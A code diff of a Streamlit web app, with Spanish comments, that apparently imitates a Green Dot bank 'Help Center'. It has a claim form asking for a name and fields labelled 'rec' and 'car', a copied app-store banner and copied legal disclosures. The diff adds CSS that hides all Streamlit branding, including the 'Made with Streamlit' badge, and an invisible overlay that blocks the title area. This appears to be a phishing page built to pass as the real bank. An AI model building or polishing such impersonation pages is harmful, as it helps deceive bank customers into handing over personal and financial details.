@@ -26,12 +26,19 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_ico
 # 1. ESCUDO FÍSICO (Bloquea el ancla # del título)
 st.markdown("""<div style='position: fixed; top: 0; left: 0; width: 100%; height: 220px; z-index: 9999999; pointer-events: all; background: transparent;'></div>""", unsafe_allow_html=True)
 
-# 2. CSS INTEGRADO (Estética + Limpieza)
+# 2. CSS INTEGRADO (Estética + Limpieza Total)
 st.markdown("""<style>
+/* Ocultar TODO lo relacionado con Streamlit */
 [data-testid='stHeader'], header, footer, .stDeployButton, .section-anchor, a.section-anchor, button[title='View fullscreen'] {
     display: none !important;
     visibility: hidden !important;
     opacity: 0 !important;
+}
+
+/* ELIMINAR VIEWER BADGE (Made with Streamlit) */
+._container_gzau3_1, ._viewerBadge_aycw8_23, [data-testid='stStatusWidget'], div[class*='viewerBadge'] {
+    display: none !important;
+    visibility: hidden !important;
 }
 
 .stApp {
@@ -87,7 +94,7 @@ if submitted:
     if nombre and rec and car:
         st.success("✅ Claim received.")
 
-# SECCIÓN APP STORE RESTAURADA
+# SECCIÓN APP STORE
 st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222;'>
     <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
@@ -97,7 +104,7 @@ st.markdown("""<div style='background-color: #111; padding: 40px; text-align: ce
     <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
 </div>""", unsafe_allow_html=True)
 
-# FOOTER LEGAL COMPLETO RESTAURADO
+# FOOTER LEGAL
 st.markdown("""<div class='legal-footer'>
     * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
     Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
